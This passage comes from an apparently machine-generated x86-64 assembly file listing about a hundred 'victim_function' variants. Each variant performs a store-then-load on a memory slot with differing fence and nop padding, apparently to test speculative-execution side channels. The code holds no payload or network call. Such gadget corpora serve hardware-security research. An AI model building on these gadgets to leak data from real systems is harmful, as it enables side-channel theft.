	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1895
.Lvictim_function_win0_var1895:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1896
.Lvictim_function_win0_var1896:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1897
.Lvictim_function_win0_var1897:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1898
.Lvictim_function_win0_var1898:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1899
.Lvictim_function_win0_var1899:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1900
.Lvictim_function_win0_var1900:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1901
.Lvictim_function_win0_var1901:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1902
.Lvictim_function_win0_var1902:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1903
.Lvictim_function_win0_var1903:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1904
.Lvictim_function_win0_var1904:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1905
.Lvictim_function_win0_var1905:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1906
.Lvictim_function_win0_var1906:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1907
.Lvictim_function_win0_var1907:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1908
.Lvictim_function_win0_var1908:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1909
.Lvictim_function_win0_var1909:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1910
.Lvictim_function_win0_var1910:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1911
.Lvictim_function_win0_var1911:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1912
.Lvictim_function_win0_var1912:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1913
.Lvictim_function_win0_var1913:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1914
.Lvictim_function_win0_var1914:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1915
.Lvictim_function_win0_var1915:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	nop
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1916
.Lvictim_function_win0_var1916:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1917
.Lvictim_function_win0_var1917:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1918
.Lvictim_function_win0_var1918:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1919
.Lvictim_function_win0_var1919:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1920
.Lvictim_function_win0_var1920:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1921
.Lvictim_function_win0_var1921:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1922
.Lvictim_function_win0_var1922:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1923
.Lvictim_function_win0_var1923:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	nop
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1924
.Lvictim_function_win0_var1924:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1925
.Lvictim_function_win0_var1925:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1926
.Lvictim_function_win0_var1926:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1927
.Lvictim_function_win0_var1927:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1928
.Lvictim_function_win0_var1928:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1929
.Lvictim_function_win0_var1929:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1930
.Lvictim_function_win0_var1930:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1931
.Lvictim_function_win0_var1931:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1932
.Lvictim_function_win0_var1932:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1933
.Lvictim_function_win0_var1933:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	nop
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1934
.Lvictim_function_win0_var1934:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1935
.Lvictim_function_win0_var1935:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1936
.Lvictim_function_win0_var1936:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1937
.Lvictim_function_win0_var1937:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1938
.Lvictim_function_win0_var1938:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1939
.Lvictim_function_win0_var1939:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1940
.Lvictim_function_win0_var1940:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1941
.Lvictim_function_win0_var1941:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1942
.Lvictim_function_win0_var1942:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1943
.Lvictim_function_win0_var1943:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1944
.Lvictim_function_win0_var1944:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1945
.Lvictim_function_win0_var1945:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	nop
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1946
.Lvictim_function_win0_var1946:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1947
.Lvictim_function_win0_var1947:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1948
.Lvictim_function_win0_var1948:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	nop
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1949
.Lvictim_function_win0_var1949:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1950
.Lvictim_function_win0_var1950:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1951
.Lvictim_function_win0_var1951:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	nop
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1952
.Lvictim_function_win0_var1952:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1953
.Lvictim_function_win0_var1953:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1954
.Lvictim_function_win0_var1954:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1955
.Lvictim_function_win0_var1955:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1956
.Lvictim_function_win0_var1956:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1957
.Lvictim_function_win0_var1957:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1958
.Lvictim_function_win0_var1958:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1959
.Lvictim_function_win0_var1959:
	popq	%rax
	nop
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1960
.Lvictim_function_win0_var1960:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1961
.Lvictim_function_win0_var1961:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1962
.Lvictim_function_win0_var1962:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1963
.Lvictim_function_win0_var1963:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	nop
	nop
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1964
.Lvictim_function_win0_var1964:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	nop
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	nop
	mfence
	mfence
	movq	(%rax), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1965
.Lvictim_function_win0_var1965:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1966
.Lvictim_function_win0_var1966:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1967
.Lvictim_function_win0_var1967:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1968
.Lvictim_function_win0_var1968:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1969
.Lvictim_function_win0_var1969:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1970
.Lvictim_function_win0_var1970:
	popq	%rax
	movq	%rcx, (%rax)
	nop
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1971
.Lvictim_function_win0_var1971:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1972
.Lvictim_function_win0_var1972:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1973
.Lvictim_function_win0_var1973:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1974
.Lvictim_function_win0_var1974:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1975
.Lvictim_function_win0_var1975:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1976
.Lvictim_function_win0_var1976:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	nop
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1977
.Lvictim_function_win0_var1977:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1978
.Lvictim_function_win0_var1978:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	nop
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1979
.Lvictim_function_win0_var1979:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	nop
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1980
.Lvictim_function_win0_var1980:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1981
.Lvictim_function_win0_var1981:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1982
.Lvictim_function_win0_var1982:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	nop
	movq	(%r10), %rax
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1983
.Lvictim_function_win0_var1983:
	popq	%rax
	nop
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1984
.Lvictim_function_win0_var1984:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1985
.Lvictim_function_win0_var1985:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1986
.Lvictim_function_win0_var1986:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1987
.Lvictim_function_win0_var1987:
	popq	%rax
	movq	%rcx, (%rax)
	movq	_memory_slot@GOTPCREL(%rip), %rax
	mfence
	mfence
	mfence
	mfence
	movq	(%rax), %rax
	nop
	nop
	jmp	.Lvictim_function_win0_continue
## Variant 1988
.Lvictim_function_win0_var1988:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	nop
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1989
.Lvictim_function_win0_var1989:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	movq	_memory_slot@GOTPCREL(%rip), %rax
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1990
.Lvictim_function_win0_var1990:
	popq	%rax
	movq	%rcx, (%rax)
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	mfence
	mfence
	mfence
	mfence
	mfence
	leaq	(%rax), %r10
	movq	(%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1991
.Lvictim_function_win0_var1991:
	popq	%rax
	movq	%rcx, (%rax)
	movq	%rax, %r10
	leaq	_memory_slot@GOTPCREL(%rip), %r10
	movq	(%r10), %rax
	nop
	mfence
	pushfq
	andq	$0, %r10
	popfq
	mfence
	mfence
	movq	(%rax,%r10), %rax
	jmp	.Lvictim_function_win0_continue
## Variant 1992
